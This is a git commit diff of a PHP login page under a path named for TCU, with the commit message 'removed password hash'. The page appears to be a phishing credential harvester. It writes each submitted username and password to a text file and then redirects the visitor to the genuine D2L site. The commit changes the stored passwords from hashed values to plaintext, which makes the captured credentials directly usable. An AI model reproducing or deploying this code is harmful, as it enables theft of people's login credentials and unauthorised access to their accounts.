ae87a0ef62b095ccb8ad7e404e0eddc31282f9da
Riley Durbin <riley.durbin@tcu.edu>
2020-04-30 15:11:24 -0500

    removed password hash

--- aws/sites/tcu/login.php
+++ aws/sites/tcu/login.php
@@ -1,5 +1,5 @@
 <?php
 
-file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . password_hash($_POST['password'], PASSWORD_DEFAULT) . "\n", FILE_APPEND);
+file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: http://d2l.tcu.edu');
 exit();
